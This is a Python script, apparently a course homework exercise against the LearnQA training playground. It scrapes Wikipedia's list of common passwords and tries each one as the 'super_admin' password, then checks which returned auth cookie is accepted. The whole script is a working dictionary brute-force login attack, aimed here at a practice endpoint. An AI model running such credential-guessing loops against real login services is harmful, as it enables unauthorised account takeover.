import json
import requests
from bs4 import BeautifulSoup
import re

get_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
pass_link = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


# Парсим таблицу, убираем элементы html и лишние строки. Приводим к cписку и возвращаем
def list_password():
    response_pass = requests.get(pass_link)
    soup = BeautifulSoup(response_pass.text, "html.parser")
    my_table = soup.select('table.wikitable')[1]
    my_table = re.sub('<[^>]*>', '', str(my_table))
    list_tab = my_table.split("\n")
    new_list = [i for i in list_tab if i != ""]
    return new_list


# Запрашиваем куки для каждого пароля. Хэдеры ответа приобразовываем в json, забираем оттуда строчку Set-Cookie.
# Откидываем лишнюю часть, добавляем в перемнную эти куки и возвращаем.
def make_cookie(pass_list):
    username = "super_admin"
    list_cookie = []
    for i in pass_list:
        response_get_cookie = requests.post(get_cookie, data={'login': username, "password": i})
        head = json.dumps(dict(response_get_cookie.headers))
        json_headers_response = json.loads(head)
        key_in_dict = json_headers_response.get("Set-Cookie")
        auth_cookie = key_in_dict.split(";")[0]
        list_cookie.append(auth_cookie)
    return list_cookie


# Спилитим куки, получаем только номер и проверяем на авторизацию. Добавляем верные в переменную и ее возвращаем.
def broot(cookie):
    pass_cookies = []
    for i in cookie:
        one = str(i).split("=")[1]
        response_broot = requests.post(check_cookie, cookies={'auth_cookie': one})
        if response_broot.text == "You are authorized":
            pass_cookies.append(one)
    return pass_cookies


def printoutfulltext(indexcook, allcook):
    # Приведение куки к полному виду, для получения индексов верных ответов в функции ниже
    cookie_ls = []
    for i in indexcook:
        strokecook = f"auth_cookie={i}"
        cookie_ls.append(strokecook)

    # Получение индексов верных паролей
    lsnumber = []
    for i in cookie_ls:
        num = allcook.index(i)
        lsnumber.append(num)
    return lsnumber


def main():
    pass_list = list_password()
    al = make_cookie(pass_list)
    numbers_in_cookie = broot(al)
    allrightcookie = printoutfulltext(numbers_in_cookie, al)
    for i in allrightcookie:
        print(f"Пароль: '{pass_list[i]}', куки для авторизации: '{al[i]}'")


if __name__ == "__main__":
    main()
